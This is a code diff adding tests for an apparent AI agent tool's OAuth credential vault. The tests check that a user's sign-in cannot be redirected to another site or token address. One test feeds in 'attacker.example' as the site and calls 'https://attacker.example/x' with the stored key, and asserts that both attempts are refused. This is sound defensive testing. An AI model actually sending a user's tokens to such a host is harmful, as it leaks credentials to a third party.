@@ -79,7 +79,7 @@ const definition = { site: "127.0.0.1", authorize_url: `${BASE}/authorize`, toke
 const LLM = "https://llm.example.com";
 
 /** The secret `label` as the Vault shows it now; undefined when there's none. */
-const secretIn = (label: string): { status: string; tag?: { text: string; ok: boolean } } | undefined => vaultState().secrets.find((s: { label: string }) => s.label === label);
+const secretIn = (label: string): { status: string; token?: string; tag?: { text: string; ok: boolean } } | undefined => vaultState().secrets.find((s: { label: string }) => s.label === label);
 
 /** The sign-in `label`'s status as the Vault shows it now; undefined when there's none. */
 const statusIn = (label: string): string | undefined => secretIn(label)?.status;
@@ -228,6 +228,33 @@ test("one sign-in per provider: a definition under another name points to the on
   const said = await call({ action: "secret", kind: "oauth", label: "demo-2", definition }, { base: LLM });
   assert.match(said, /^Library: there's a sign-in at 127\.0\.0\.1:\d+ already: "demo"/);
   assert.deepEqual(vaultState().secrets.map((s: { label: string }) => s.label), ["demo"]);
+});
+
+/** The refusal of a definition that moves the sign-in "demo" from where the user gave its client. */
+const moved = /"demo" has the user's client, given for site 127\.0\.0\.1, authorize_url http:\/\/127\.0\.0\.1:\d+\/authorize, token_url http:\/\/127\.0\.0\.1:\d+\/token: a definition given again keeps those and changes only its scopes and params\. For another site or provider, the user deletes it on the Vault first/;
+
+test("a sign-in with the user's client can't be moved to another site: its tokens stay, and go nowhere else", async () => {
+  const q = Object.fromEntries((await link()).searchParams);
+  post({ ev: "oauth-code", state: q.state, code: "good-code" });
+  assert.equal(await statusOf("demo"), "signed in");
+  assert.match(await call({ action: "secret", kind: "oauth", label: "demo", definition: { ...definition, site: "attacker.example" } }, { base: LLM }), moved);
+  assert.equal(await statusOf("demo"), "signed in", "nothing dropped");
+  assert.match(await call({ action: "call", url: "https://attacker.example/x", auth: { key: "demo", as: "basic:x" } }), /the key "demo" is for 127\.0\.0\.1 over https, and goes nowhere else/);
+  // Its scopes may change: the client stays, the tokens for the old scopes go.
+  const rescoped = linkIn(await call({ action: "secret", kind: "oauth", label: "demo", definition: { ...definition, scopes: ["me.read", "me.write"] } }, { base: LLM }));
+  assert.equal(rescoped.searchParams.get("client_id"), "client-1");
+  assert.equal(rescoped.searchParams.get("scope"), "me.read me.write");
+  assert.equal(await statusOf("demo"), "waiting for the user to sign in at its link");
+});
+
+test("the user's client can't be sent to another token or device address; before the user gives one, the definition may change", async () => {
+  await call({ action: "secret", kind: "oauth", label: "demo", definition: { ...definition, token_url: `${OTHER}/token` } }, { base: LLM });
+  await link(); // the agent fixes its token_url while there's no client yet
+  assert.equal(secretIn("demo")?.token, new URL(BASE).host, "the Vault shows where the client goes");
+  for (const def of [{ ...definition, token_url: `${OTHER}/token` }, { ...definition, device_url: `${OTHER}/device/code` }, { ...definition, authorize_url: `${BASE}/elsewhere` }]) {
+    assert.match(await call({ action: "secret", kind: "oauth", label: "demo", definition: def }, { base: LLM }), moved);
+  }
+  assert.match(await call({ action: "secret", kind: "oauth", label: "demo", definition }, { base: LLM }), /still waits/, "the link waits as it was");
 });
 
 test("without an https address, the sign-in ends on 127.0.0.1, and the user pastes that address into the page", async () => {
@@ -452,6 +479,8 @@ test("a preset's sign-in takes no definition: the code waiting stays, and so do 
   assert.equal(gh(), "signed in");
   assert.match(await call({ action: "secret", kind: "oauth", label: "gh", definition: deviceDef }), /signs in with a preset/);
   assert.equal(gh(), "signed in", "a refused definition drops no tokens");
+  await saveSignIn("127.0.0.1", "gh", define(deviceDef), "client-1");
+  assert.equal(await statusOf("gh"), "signed in", "the preset given again keeps them");
 });
 
 test("a device sign-in whose token ran out with nothing to renew it signs in again with a new code", async () => {
